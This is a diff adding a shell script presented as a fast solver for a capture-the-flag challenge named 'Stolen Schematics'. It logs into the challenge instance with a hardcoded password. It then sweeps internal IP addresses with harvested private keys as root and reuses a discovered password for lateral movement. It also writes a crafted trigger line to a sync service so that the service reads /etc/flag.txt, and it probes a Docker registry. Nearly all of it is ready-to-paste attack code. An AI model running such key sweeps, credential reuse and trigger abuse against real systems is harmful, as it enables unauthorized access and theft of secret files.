@@ -1,0 +1,53 @@
+# STOLEN SCHEMATICS - ULTRA FAST SOLVER
+# NEW INSTANCE: ssh player@instance.ctf.tdho.st -p 32892
+# Password: reyalp
+
+# PASTE THIS ENTIRE BLOCK IN KALI:
+
+sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p 32892 player@instance.ctf.tdho.st << 'EOF'
+
+echo "=== STOLEN SCHEMATICS FAST SOLVE ==="
+
+# Set permissions on keys
+chmod 600 /tmp/key_*.pem 2>/dev/null
+
+# Check what's on THIS container first
+echo "[*] Current container IP:"
+hostname -I
+
+echo ""
+echo "[*] Checking for watcher.sh process HERE:"
+ps aux | grep -i watcher | grep -v grep
+
+echo ""
+echo "[*] Checking /opt/mc structure:"
+ls -laR /opt/mc/ 2>/dev/null | head -30
+
+echo ""
+echo "[*] Fast SSH scan with BOTH keys to all IPs..."
+
+# Try ONLY the most likely targets with FAST timeout
+for ip in 172.27.0.1 172.27.0.4 172.27.0.5 172.27.0.6; do
+    echo "[Testing $ip]"
+    
+    # Try key_1 as root (most common for watcher container)
+    timeout 1 ssh -i /tmp/key_1.pem -o StrictHostKeyChecking=no -o BatchMode=yes root@$ip "hostname; ls -la /opt/mc/.sync/ 2>/dev/null; echo 'FILE-READ:/etc/flag.txt?talldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true' > /opt/mc/.sync/sync.trigger 2>/dev/null; sleep 1; cat /opt/mc/sync.log /etc/flag.txt 2>/dev/null | grep TDHT" 2>/dev/null && echo "[+++] KEY1 ROOT SUCCESS ON $ip"
+    
+    # Try key_2 as root
+    timeout 1 ssh -i /tmp/key_2.pem -o StrictHostKeyChecking=no -o BatchMode=yes root@$ip "hostname; ls -la /opt/mc/.sync/ 2>/dev/null; echo 'FILE-READ:/etc/flag.txt?talldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true' > /opt/mc/.sync/sync.trigger 2>/dev/null; sleep 1; cat /opt/mc/sync.log /etc/flag.txt 2>/dev/null | grep TDHT" 2>/dev/null && echo "[+++] KEY2 ROOT SUCCESS ON $ip"
+done
+
+echo ""
+echo "[*] Trying password-based auth with discovered password..."
+for ip in 172.27.0.1 172.27.0.4; do
+    sshpass -p "dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 player@$ip "ls -la /opt/mc/.sync/; cat /etc/flag.txt 2>/dev/null" 2>/dev/null && echo "[+++] Password worked on $ip"
+done
+
+echo ""
+echo "[*] Checking Docker Registry directly for flag..."
+timeout 2 curl -s http://172.27.0.1:5000/v2/_catalog 2>/dev/null || echo "Registry not accessible via HTTP"
+
+echo ""
+echo "=== SCAN COMPLETE ==="
+
+EOF
